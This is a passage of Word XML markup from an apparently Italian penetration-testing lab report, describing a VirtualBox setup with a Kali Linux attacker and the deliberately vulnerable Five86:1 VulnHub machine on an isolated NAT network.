        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A82052">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Target Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4134756D" w14:textId="2AE3CF3B" w:rsidR="00AE4289" w:rsidRPr="00B703CC" w:rsidRDefault="00AE4289">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A82052">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Post Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7724A747" w14:textId="132A35F7" w:rsidR="00CE488A" w:rsidRPr="00550195" w:rsidRDefault="00844D78" w:rsidP="00844D78">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="2" w:name="_Toc139378595"/>
      <w:r w:rsidRPr="00550195">
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">2 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00AE4289" w:rsidRPr="00550195">
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>Strumenti</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00AE4289" w:rsidRPr="00550195">
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00550195">
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>U</w:t>
      </w:r>
      <w:r w:rsidR="00AE4289" w:rsidRPr="00550195">
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>tilizzati</w:t>
      </w:r>
      <w:bookmarkEnd w:id="2"/>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7FEFBD71" w14:textId="77777777" w:rsidR="00844D78" w:rsidRPr="00B703CC" w:rsidRDefault="00844D78" w:rsidP="00844D78">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="470DBA40" w14:textId="5E58B673" w:rsidR="00844D78" w:rsidRPr="00550195" w:rsidRDefault="00844D78" w:rsidP="00844D78">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="3" w:name="_Toc139378596"/>
      <w:r w:rsidRPr="00550195">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>2.1 Ambiente di lavoro</w:t>
      </w:r>
      <w:bookmarkEnd w:id="3"/>
    </w:p>
    <w:p w14:paraId="2763374F" w14:textId="6A23C8B1" w:rsidR="00844D78" w:rsidRPr="00B703CC" w:rsidRDefault="00955483" w:rsidP="0070599A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">L’ambiente di lavoro utilizzato per l’attività di </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>penetration</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> testing è stato realizzato tramite </w:t>
      </w:r>
      <w:r w:rsidRPr="00A82052">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>l’</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A82052">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>hypervisor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Oracle Virtual Box (v7.0.6)</w:t>
      </w:r>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00F131B1" w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> L’architettura di rete è composta </w:t>
      </w:r>
      <w:r w:rsidR="0070599A" w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>da tre componenti, che riguardano</w:t>
      </w:r>
      <w:r w:rsidR="00D36206">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="0070599A" w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> in primis </w:t>
      </w:r>
      <w:r w:rsidR="00F131B1" w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>la macchina attaccante con le seguenti caratteristiche:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DD0C1EC" w14:textId="399508C6" w:rsidR="00F131B1" w:rsidRPr="00B703CC" w:rsidRDefault="00F131B1">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Nome: </w:t>
      </w:r>
      <w:r w:rsidR="0070599A" w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>P&amp;H</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C90CC98" w14:textId="4CD2970C" w:rsidR="00F131B1" w:rsidRPr="00B703CC" w:rsidRDefault="00F131B1">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Sistem</w:t>
      </w:r>
      <w:r w:rsidR="00D36206">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Operativo: Kali Linux (2022.4) x64</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06210BA8" w14:textId="0C84FDBF" w:rsidR="00F131B1" w:rsidRPr="00B703CC" w:rsidRDefault="00F131B1">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Memoria di base: 6144 MB</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60992A14" w14:textId="5AF50D33" w:rsidR="00F131B1" w:rsidRPr="00B703CC" w:rsidRDefault="00F131B1">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Processori: 4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B1897F8" w14:textId="27E304A1" w:rsidR="00F131B1" w:rsidRPr="00B703CC" w:rsidRDefault="00F131B1">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Scheda di rete: Intel PRO/1000 MT Desktop (Rete con NAT, ‘Corso’)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4731BFDB" w14:textId="3E9CA204" w:rsidR="0070599A" w:rsidRPr="00B703CC" w:rsidRDefault="00F131B1" w:rsidP="0070599A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>La maggior parte dei</w:t>
      </w:r>
      <w:r w:rsidR="0070599A" w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> tool utilizzati per l’elaborazione del progetto sono già integrati su Kali, verranno trattati anche eventuali tool aggiuntivi che non sono presenti di default. Tutti i </w:t>
      </w:r>
      <w:r w:rsidR="0070599A" w:rsidRPr="00A82052">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>tool</w:t>
      </w:r>
      <w:r w:rsidR="0070599A" w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> utilizzati verranno descritti nelle sezioni successive.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6243557E" w14:textId="77777777" w:rsidR="00B703CC" w:rsidRDefault="00B703CC" w:rsidP="0070599A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="777891C0" w14:textId="77777777" w:rsidR="00B703CC" w:rsidRDefault="00B703CC" w:rsidP="0070599A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A6462A2" w14:textId="77777777" w:rsidR="00B703CC" w:rsidRDefault="00B703CC" w:rsidP="0070599A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14453E39" w14:textId="677C6610" w:rsidR="0070599A" w:rsidRPr="00B703CC" w:rsidRDefault="0070599A" w:rsidP="0070599A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Successivamente abbiamo la macchina target con le seguenti caratteristiche:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15C58BAD" w14:textId="382E48F9" w:rsidR="0070599A" w:rsidRPr="00B703CC" w:rsidRDefault="0070599A">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Nome: Five86</w:t>
      </w:r>
      <w:r w:rsidR="00B703CC" w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D5AB5B5" w14:textId="265AFB33" w:rsidR="0070599A" w:rsidRPr="00B703CC" w:rsidRDefault="0070599A">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Sistema operativo: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Debian</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> x64</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04788074" w14:textId="1EE592B1" w:rsidR="0070599A" w:rsidRPr="00B703CC" w:rsidRDefault="0070599A">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Memoria di base: 1024 MB</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="784316F4" w14:textId="2DFFBD29" w:rsidR="0070599A" w:rsidRPr="00B703CC" w:rsidRDefault="0070599A">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Processori: 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D5A9F8C" w14:textId="7F4F1BA3" w:rsidR="0070599A" w:rsidRPr="00B703CC" w:rsidRDefault="0070599A">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Scheda di rete: Intel PRO/1000 MT Desktop (Rete con NAT, ‘Corso’)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="795804C0" w14:textId="77777777" w:rsidR="005D1AB9" w:rsidRDefault="005D1AB9" w:rsidP="00B703CC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E45668D" w14:textId="26BE9B49" w:rsidR="00B703CC" w:rsidRPr="00B703CC" w:rsidRDefault="00B703CC" w:rsidP="00B703CC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Five86:1 è una macchina </w:t>
      </w:r>
      <w:bookmarkStart w:id="4" w:name="_Hlk135408557"/>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>vulnerabile by design</w:t>
      </w:r>
      <w:bookmarkEnd w:id="4"/>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, mirata all’apprendimento di nuove metodologie di </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>penetration</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> testing. Il </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">file </w:t>
      </w:r>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ova</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> è stato scaricato dalla piattaforma </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>VulnHub</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">al seguente indirizzo </w:t>
      </w:r>
      <w:hyperlink r:id="rId11" w:history="1">
        <w:r w:rsidRPr="00B703CC">
          <w:rPr>
            <w:rStyle w:val="Collegamentoipertestuale"/>
            <w:rFonts w:cs="Times New Roman"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>https://www.vulnhub.com/entry/five86-1,417/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BF9E729" w14:textId="022621C5" w:rsidR="00B703CC" w:rsidRPr="00B703CC" w:rsidRDefault="00B703CC" w:rsidP="00B703CC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">All’interno dell’infrastruttura di rete troviamo una rete virtuale con </w:t>
      </w:r>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>NAT,</w:t>
      </w:r>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> che permette di collegare le due macchine nella stessa rete, in modo che riescano a comunicare, </w:t>
      </w:r>
      <w:r w:rsidR="00E50D1E" w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ma,</w:t>
      </w:r>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> le macchine </w:t>
      </w:r>
      <w:r w:rsidR="00976716">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>esterne</w:t>
      </w:r>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> non possono accedervi</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50D1E">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50D1E">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">L’indirizzo IP della macchina target non è noto a priori poiché viene assegnato in modo automatico dal </w:t>
      </w:r>
      <w:r w:rsidRPr="00A82052">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>DHCP</w:t>
      </w:r>
      <w:r w:rsidR="00E50D1E">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Nella Figura 1 viene mostrata l’architettura rete del progetto descritto precedentemente.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E4F417B" w14:textId="77777777" w:rsidR="0070599A" w:rsidRPr="0070599A" w:rsidRDefault="0070599A" w:rsidP="0070599A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="106F61A1" w14:textId="1E763975" w:rsidR="00B239BB" w:rsidRDefault="00E50D1E" w:rsidP="00262AA4">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4DF2DF28" wp14:editId="6D989EA5">
            <wp:extent cx="5274310" cy="2207895"/>
            <wp:effectExtent l="0" t="0" r="2540" b="1905"/>
            <wp:docPr id="1586691163" name="Immagine 1" descr="Immagine che contiene testo, schermata, logo,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91163" name="Immagine 1" descr="Immagine che contiene testo, schermata, logo, Marchio&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId12"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="2207895"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00262AA4" w:rsidRPr="00B74592">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Figura </w:t>
      </w:r>
      <w:r w:rsidR="00DF5ECF">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="00262AA4" w:rsidRPr="00B74592">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00262AA4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Architettura di rete</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="531D5123" w14:textId="77777777" w:rsidR="005D1AB9" w:rsidRDefault="005D1AB9" w:rsidP="00B239BB">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0AD9C432" w14:textId="43F4878D" w:rsidR="00B239BB" w:rsidRPr="00550195" w:rsidRDefault="00B239BB" w:rsidP="00B239BB">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="5" w:name="_Toc139378597"/>
      <w:r w:rsidRPr="00550195">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>2.</w:t>
      </w:r>
      <w:r w:rsidR="00083AF2">
        <w:rPr>
